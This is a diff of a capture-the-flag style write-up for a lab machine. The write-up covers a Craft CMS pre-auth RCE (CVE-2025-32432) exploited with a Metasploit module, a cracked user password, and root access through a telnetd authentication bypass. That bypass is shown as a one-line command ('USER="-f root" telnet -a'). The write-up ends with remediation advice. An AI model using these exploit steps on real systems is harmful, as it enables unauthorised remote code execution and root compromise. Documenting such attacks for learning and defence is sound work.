@@ -85,15 +85,14 @@ Progress: 8069 / 62281 (12.96%)^C
 
 **Vulnerable Craft CMS 5.6.16:**
 
-![](./screens/1.png)
+![](./screens/2.png)
 
 ---
-
 ## Foothold
 
 ### CVE-2025-32432
 
-Craft is a flexible, user-friendly CMS for creating custom digital experiences on the web and beyond. Starting from version 3.0.0-RC1 to before 3.9.15, 4.0.0-RC1 to before 4.14.15, and 5.0.0-RC1 to before 5.6.17, Craft is vulnerable to unauthenticated remote code execution. Attackers can inject custom PHP objects via the asset generation endpoints to execute arbitrary commands. This is a high-impact, low-complexity attack vector. The issue has been patched in versions 3.9.15, 4.14.15, and 5.6.17, and is an additional fix for CVE-2023-41892.
+Craft is a user-friendly CMS for creating custom digital experiences on the web and beyond. Starting from version 3.0.0-RC1 to before 3.9.15, 4.0.0-RC1 to before 4.14.15, and 5.0.0-RC1 to before 5.6.17, Craft is vulnerable to unauthenticated remote code execution. Attackers can inject custom PHP objects via the asset generation endpoints to execute arbitrary commands. This is a high-impact, low-complexity attack vector. The issue has been patched in versions 3.9.15, 4.14.15, and 5.6.17, and is an additional fix for CVE-2023-41892.
 
 The vulnerability is exploited in the wild against vulnerable Craft CMS instances as follows:
 
@@ -102,12 +101,9 @@ The vulnerability is exploited in the wild against vulnerable Craft CMS instance
 - The payload includes a PHP object that gets deserialized, leading to arbitrary code execution through the `GuzzleHttp\Psr7\FnStream` class.
 
 Source: [SonicWall — CraftCMS Vulnerability Exposes Systems to Pre-Auth RCE (CVE-2025-32432)](https://www.sonicwall.com/it-it/blog/craftcms-vulnerability-exposes-systems-to-pre-auth-rce-now-exploited-in-the-wild-cve-2025-32432-)
-
 ### Exploitation
 
 PoC: [Rapid7 — craftcms_preauth_rce_cve_2025_32432](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_preauth_rce_cve_2025_32432/)
-
-shell
 
 ```shell
 msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
@@ -163,7 +159,6 @@ meterpreter >
 A Meterpreter session is obtained as `www-data`.
 
 ---
-
 ## Lateral Movement
 
 ### From www-data to adam
@@ -397,7 +392,6 @@ Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
 Credentials recovered: `adam:darkangel`
 
 ---
-
 ## User Flag
 
 ```
@@ -412,7 +406,6 @@ c0a*************************536
 ```
 
 ---
-
 ## Privilege Escalation
 
 ### Enumeration
@@ -457,8 +450,6 @@ This causes `login -f root` to be executed by the telnet daemon, granting immedi
 
 PoC: [Telnetd Auth Bypass to Root](https://medium.com/@shivam_bathla/telnetd-auth-bypass-to-root-f6e239d692b5)
 
-shell
-
 ```shell
 adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
 Trying 127.0.0.1...
@@ -479,8 +470,6 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)
 root@orion:~#
 ```
 
----
-
 ## Root Flag
 
 ```
@@ -489,16 +478,14 @@ root@orion:~# cat /root/root.txt
 ```
 
 ---
-
 ## Remediation
 
 - **CVE-2025-32432:** Upgrade Craft CMS to a patched version (3.9.15, 4.14.15, 5.6.17, or later).
 - **Plaintext database credentials:** Avoid storing database credentials in plaintext environment variables readable by the application's own process. Use a secrets manager or restricted-permission secrets file instead.
 - **Weak credentials:** Enforce a strong password policy for application and system accounts to resist offline cracking against common wordlists.
-- **CVE-2026-24061:** Upgrade `telnetd` (GNU Inetutils) to a patched version, or — preferably — remove telnet entirely in favor of SSH, which does not suffer from this class of authentication bypass.
+- **CVE-2026-24061:** Upgrade `telnetd` (GNU Inetutils) to a patched version, preferably remove telnet entirely in favor of SSH, which does not suffer from this class of authentication bypass.
 
 ---
-
 ## References
 
 - [SonicWall — CraftCMS Vulnerability Exposes Systems to Pre-Auth RCE (CVE-2025-32432)](https://www.sonicwall.com/it-it/blog/craftcms-vulnerability-exposes-systems-to-pre-auth-rce-now-exploited-in-the-wild-cve-2025-32432-)
